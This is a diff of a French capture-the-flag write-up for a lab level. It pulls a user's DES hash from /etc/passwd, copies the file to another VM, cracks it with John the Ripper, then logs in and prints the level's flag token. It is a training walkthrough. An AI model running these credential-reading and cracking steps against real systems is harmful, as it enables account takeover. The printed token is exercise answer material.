@@ -14,11 +14,23 @@ cat /etc/passwd
 cat /etc/passwd | grep flag01 > pass
     -> flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
 
+- On utilise scp pour transferer le fichier pass sur notre machine locale puis dans une vm contenant le 
+logiciel de decryptage
+scp -P 4242 level01@10.11.200.196:/tmp/pass  ~/; scp ~/pass user@10.11.200.59:~/
+    - Le fichier pass est maintenant dans la vm avec le logiciel de decryptage
+
 - Decrypter le mot de passe avec un logiciel (Here comes Johnny ;))
 aptitude install john ; john pass
-    -> Done
+    -> Done:
+    Loaded 1 password hash (descryot, traditional crypt(3) [DES 128/128 SSE2-16])
+    Press 'q' or Crtl-C to abort, almost any other key for status
+    abcdefg     (flag01)
     
 John The Ripper a retrouvé le mot de passe d'origine comme étant "abcdefg"
+su flag01
+Password: abcdefg
+getflag
+Check flag.Here is your token : f2av5il02puano7naaf6adaaf
 
 Sources:
     - https://null-byte.wonderhowto.com/how-to/crack-shadow-hashes-after-getting-root-linux-system-0186386/
